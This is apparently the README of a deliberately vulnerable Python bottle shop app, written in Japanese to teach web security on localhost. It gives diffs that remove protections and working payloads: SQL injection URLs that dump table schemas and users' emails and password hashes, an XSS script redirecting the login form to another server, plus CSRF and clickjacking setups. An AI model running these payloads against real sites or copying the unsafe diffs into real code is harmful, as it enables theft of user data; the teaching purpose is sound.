# bottle-store

EC site example using Python bottle.

## はじめかた（Windows）

PythonとVSCodeをインストールします。

仮想環境を作ります。仮想環境名は```venv```とします。

```console
> py -m venv venv
(venv)>
```

必要なモジュールをインストールします。

```console
(venv)> pip install -r requirements.txt
```

データベースを初期化します。データベースのファイル```app.db```が作成されます。

```console
(venv)> py setup.py
```

署名付きcookieのための鍵を環境変数```STORE_SECRET_KEY```に設定します。

```console
(venv)> set STORE_SECRET_KEY=<署名付きcookieのための鍵（文字列）>
```

サーバーを起動します。localhost:8080で立ち上がります。環境変数を設定し忘れていると、RuntimeErrorが発生して起動できないのでご注意ください。

```console
(venv)> py app.py
```

Webブラウザーで http://localhost:8080/ にアクセスすると使えます。

ユーザー1でログインしてみます。

- メールアドレス
  - user1@example.com
- パスワード
  - password1

なおChromeでこのパスワードを使うと「パスワードを変更してください（パスワードが漏洩しました）」という警告が表示されます。

## ここから先の注意事項

犯罪になるので、外部サービスに対してはここから先に書いてあることを試してはいけません。絶対にやめてください。

## SQLインジェクション

```app.py```を次のように書き換えます。プレースホルダ```?```（はてな）を使わずに、文字列を連結してSQL文を作っています。

```diff:app.py
-        results = cur.execute("SELECT * FROM rated_products WHERE name LIKE ?;", ("%" + query + "%",)).fetchall()
+        results = cur.execute("SELECT * FROM rated_products WHERE name LIKE '%" + query + "%'").fetchall()
```

Webブラウザーで商品一覧を表示します。

```
http://localhost:8080/products
```

商品名で検索ができます。次のようなSQL文を使っているのではないか？と攻撃者は推測します。

```sql
SELECT * FROM <商品テーブル名> LIKE '%<検索文字列>%';
```

攻撃者は外部から入力される検索文字列の扱いが雑なことを期待して、SQL文の断片```'--```（シングルクォート、ハイフン、ハイフン）で検索してみます。

```
http://localhost:8080/products?q='--
```

攻撃者は実行されるSQL文が次のようになることを期待しています。LIKEの条件が間違った、おかしなSQL文です。おかしなSQL文が期待通りに実行されれば、エラーが表示されるはずです。

```sql
SELECT * FROM <商品テーブル名> LIKE '%'--%';
```

Internal Server Errorが表示され、攻撃者が入力したSQL文の断片によりSQLインジェクションが成功したことを示唆しています。

次に攻撃者はデータベースで管理しているテーブルの情報を引き出そうと試みます。SQLiteの場合は特別なテーブル```sqlite_master```から、データベースのメタ情報を引き出すことが可能です。

```
http://localhost:8080/products?q=x%' UNION SELECT 1, tbl_name, sql, 1, 1, 1 FROM sqlite_master--
```

攻撃者が期待するSQL文は次の通りです。UNIONは2つのSELECTを統合するときに使います。前半のSELECTでは「xで終わる商品」を検索しています。後半のSELECTでは、テーブル名```tbl_name```と、テーブルを作成するsqlを検索します。sqlからカラム名が分かります。

```sql
SELECT * FROM <商品テーブル名> LIKE '%x' UNION SELECT 1, tbl_name, sql, 1, 1, 1 FROM sqlite_master--%';
```

検索結果からusersテーブルがあることと、そのカラム名が分かりました。ここからさらに情報を引き出します。

```
http://localhost:8080/products?q=x%' UNION SELECT 1, id, email, 1, hashed_password, nickname FROM users--
```

usersテーブルのid、email、hashed_password、nicknameが漏洩してしまいました。かろうじてパスワードはハッシュ化されています。パスワードを平文のまま保存していたら大変なことになっていましたが、時間稼ぎにしかなりません。

### SQLインジェクションを防ぐには

絶対にプレースホルダーを使いましょう！

# Reflected XSS

```diff:app.py
-<p style="color:red;"> {{ message }} </p>
+<p style="color:red;"> {{ !message }} </p>
```

```
http://localhost:8080/login?message=<s>hello</s>
```

```
http://localhost:8080/login?message=<script>window.onload=function(){document.querySelector('form').action='http://localhost:8081/users'}</script>
```

# CSRF and Persistent XSS

```diff:app.py
-    if form_token != cookie_token:
-        abort(400, '不正なアクセスです。')
+    #if form_token != cookie_token:
+    #    abort(400, '不正なアクセスです。')
```

```
http://localhost:8081/evil_game1
```

```diff:app.py
-        <li>{{ comment }}</li>
+        <li>{{ !comment }}</li>
```

```
http://localhost:8081/evil_game2
```

# Clickjacking

```diff:app.py
-    response.headers['X-Frame-Options'] = 'DENY'
+   response.headers['X-Frame-Option'] = 'DENY'
```

```
http://localhost:8081/evil_game3
```

# DOM based XSS

